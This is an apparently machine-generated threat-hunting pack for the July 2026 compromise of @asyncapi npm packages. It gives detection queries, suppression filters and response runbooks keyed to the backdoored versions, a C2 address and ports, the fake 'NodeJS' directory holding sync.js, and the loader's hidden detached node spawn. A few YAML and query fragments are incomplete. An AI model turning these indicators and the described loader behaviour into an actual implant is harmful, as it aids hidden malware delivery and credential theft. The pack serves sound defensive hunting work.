Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process · Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha) · PowerShell encoded / obfuscated command · Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Unpacking the AsyncAPI npm supply chain compromise and import-time payload deliv
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Second-stage sync.js dropped under OS 'NodeJS' masquerade directory · [LLM] Detached hidden node.exe executing sync.js from NodeJS masquerade path
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Outbound C2 to Miasma controller 85.137.53.71 on ports 8080/8081/8091 · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → OAuth consent / suspicious app grant · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
Compromised @asyncapi npm package versions resolved into node_modules / Yarn cache AIDelivery High
Hunts for the five backdoored @asyncapi package versions (@asyncapi/specs 6.11.2 & 6.11.2-alpha.1, generator 3.3.1, generator-components 0.7.1, generator-helpers 1.1.1) landing on developer/CI hosts via npm or Yarn dependency resolution. Article-specific because it pins the exact malicious name+version pairs Microsoft/Socket confirmed, not generic 'npm install' activity. Rationale: Anchors on the exact malicious name+version pairs Microsoft published and Socket/StepSecurity independently confirmed; package name is always lowercase in the registry/cache so no casing enumeration needed, and version+name combined is high-fidelity. Cross-checked against: • https://socket.dev/blog/asyncapi-supply-chain-attack • https://www.stepsecurity.io/blog/compromised-next-branch-pushes-malicious-asyncapi-generator-generator-helpers-and-generator-components-to-npm • https://thehackernews.com/2026/07/compromised-asyncapi-npm-packages.html
ATT&CKT1195.002
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security researchers or IR teams intentionally downloading the malicious versions into a sandbox for analysis
  • An internal mirror/Artifactory that cached the bad versions during the exposure window and is now being audited
  • Developers who pinned 6.11.2 in a lockfile and re-ran install against a still-poisoned private proxy
  • Yarn/npm cache directories restored from an old backup image containing the version
Suppression filter
| where InitiatingProcessFileName in~ ("node.exe","node","npm.exe","yarn.exe","npm-cli.js") and not (InitiatingProcessCommandLine has_any ("malware-analysis","sandbox","detonate"))
Response runbook
1) Triage: confirm the file path is a real install target (node_modules, .yarn/cache, npm _cacache) and not a knowingly-collected sample; capture the host, user, and whether it's a dev box or CI runner. 2) Contain: isolate the host, purge npm & Yarn caches, remove all five affected versions, and pin @asyncapi/specs to a known-good release; block 85.137.53.71:8080/8081/8091 at egress. 3) Hunt: on the same host pivot to a detached node child writing sync.js under the NodeJS masquerade dir and any outbound IPFS fetch; rotate every credential reachable from that environment (npm tokens, GitHub CLI, AWS, SSH keys).
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType in ("FileCreated","FileModified")
| where FileName has "asyncapi"
| where (FileName has "specs" and FileName has "6.11.2")
    or (FileName has "generator-helpers" and FileName has "1.1.1")
    or (FileName has "generator-components" and FileName has "0.7.1")
    or (FileName has "generator" and FileName has "3.3.1")
| project Timestamp, DeviceName, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where EventType in ("FileCreated","FileModified")
| where TargetFileName has "asyncapi"
| where (TargetFileName has "specs" and TargetFileName has "6.11.2")
    or (TargetFileName has "generator-helpers" and TargetFileName has "1.1.1")
    or (TargetFileName has "generator-components" and TargetFileName has "0.7.1")
    or (TargetFileName has "generator" and TargetFileName has "3.3.1")
| project TimeGenerated, DvcHostname, TargetFileName, TargetFilePath, TargetFileSHA256, ActingProcessName, ActingProcessCommandLine, ActorUsername
| order by TimeGenerated desc

description: Detects the exact malicious @asyncapi package+version tarballs/files from the July 2026 npm supply-chain compromise landing in node_modules or package-manager caches.
references:
  - https://www.microsoft.com/en-us/security/blog/2026/07/15/unpacking-asyncapi-npm-supply-chain-compromise-import-time-payload-delivery/

      - '6.11.2'
  helpers:

source:windows.sysmon @EventID:11 (@TargetFilename:*asyncapi*specs*6.11.2* OR @TargetFilename:*asyncapi*generator-helpers*1.1.1* OR @TargetFilename:*asyncapi*generator-components*0.7.1* OR @TargetFilename:*asyncapi*generator*3.3.1*)

Second-stage sync.js dropped under OS 'NodeJS' masquerade directory AIInstallation High
Detects the import-time loader writing its IPFS-fetched second stage as sync.js into the OS-specific NodeJS masquerade folder (%LOCALAPPDATA%\NodeJS, ~/Library/Application Support/NodeJS, ~/.local/share/NodeJS, ~/.config/NodeJS). Article-specific: the fixed filename sync.js plus the fake NodeJS directory is a unique fingerprint of this campaign, not generic file drops. Rationale: Uses the verbatim FILE_NAME='sync.js' constant and the getTargetDirectory() 'NodeJS' masquerade paths from the article's code block 2 — the combination is unique to this loader and confirmed by Microsoft's own Query 1. Cross-checked against: • https://safedep.io/asyncapi-generator-supply-chain-attack-miasma-rat/ • https://www.wiz.io/blog/m-red-team-asyncapi-supply-chain-compromise-via-github-actions
ATT&CKT1036.005 T1105
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A legitimate internal tool that genuinely names its data dir 'NodeJS' and writes a sync.js sync script
  • Developer scaffolding/boilerplate that creates a sync.js worker under an app-support folder
  • A backup/restore of a previously-infected profile re-materializing sync.js
  • Security tooling replaying the sample into a NodeJS folder during analysis
Suppression filter
| where InitiatingProcessFileName in~ ("node.exe","node") or InitiatingProcessFolderPath has "npm" or InitiatingProcessFolderPath has "yarn"
Response runbook
1) Triage: hash sync.js and check its parent process — a node.exe/node child with detached/hidden flags confirms; benign scripts have a real signed parent. 2) Contain: isolate the host, kill the detached node process tree, delete sync.js, and block 85.137.53.71:8080/8081/8091 plus ipfs.io retrieval at egress. 3) Hunt: pivot to which @asyncapi version installed on the host, look for outbound IPFS CID fetches (Qmet4… / QmQobZSp…), and rotate all credentials reachable from the environment given Miasma's credential-harvest module.
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType == "FileCreated"
| where FileName =~ "sync.js"
| where FolderPath has "NodeJS"
| project Timestamp, DeviceName, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where EventType == "FileCreated"
| where TargetFileName =~ "sync.js"
| where TargetFilePath has "NodeJS"
| project TimeGenerated, DvcHostname, TargetFileName, TargetFilePath, TargetFileSHA256, ActingProcessName, ActingProcessCommandLine, ActorUsername
| order by TimeGenerated desc

Detached hidden node.exe executing sync.js from NodeJS masquerade path AIInstallation High
Detects the import-time payload's execution stage: a node process launching the dropped sync.js out of the NodeJS masquerade directory, matching the spawn('node',[payloadPath],{detached,stdio:ignore,windowsHide}) pattern. Article-specific via the sync.js + NodeJS command-line pairing (mirrors Microsoft's published hunting Query 1). Rationale: Combines the verbatim FILE_NAME 'sync.js' and 'NodeJS' masquerade path from code block 2 with a node interpreter parent — the same signal Microsoft ships as their behavioral coverage for the detached Node.js spawn. Cross-checked against: • https://www.wiz.io/blog/m-red-team-asyncapi-supply-chain-compromise-via-github-actions • https://www.aikido.dev/blog/asyncapi-npm-packages-backdoored-via-github-actions
ATT&CKT1059.007 T1564.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • An in-house Node app that happens to keep a sync.js worker inside a directory literally named NodeJS
  • Electron/CLI tooling that stores helper scripts under an app-support NodeJS folder
  • Analyst detonation of the sample in a sandbox VM
  • A monorepo build task named sync.js executed with a NodeJS-prefixed cwd
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("jest","webpack","vite","--build") and DeviceName has "build")
Response runbook
1) Triage: inspect the full command line and grandparent — a build/import node.exe (from npm/yarn) spawning this detached child confirms the chain; note the SHA256 of sync.js. 2) Contain: isolate host, terminate the detached node tree, remove sync.js, and block the C2 IP/ports and IPFS egress. 3) Hunt: correlate to the affected @asyncapi version on the host and any outbound connection to 85.137.53.71 or ipfs.io CIDs within minutes; force credential rotation for npm/GitHub/AWS/SSH accessible from that host.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName has "node"
| where ProcessCommandLine has "sync.js"
| where ProcessCommandLine has "NodeJS"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)

| where TargetProcessCommandLine has "sync.js" and TargetProcessCommandLine has "NodeJS"
| project TimeGenerated, DvcHostname, TargetUsername, ActingProcessName, TargetProcessName, TargetProcessCommandLine
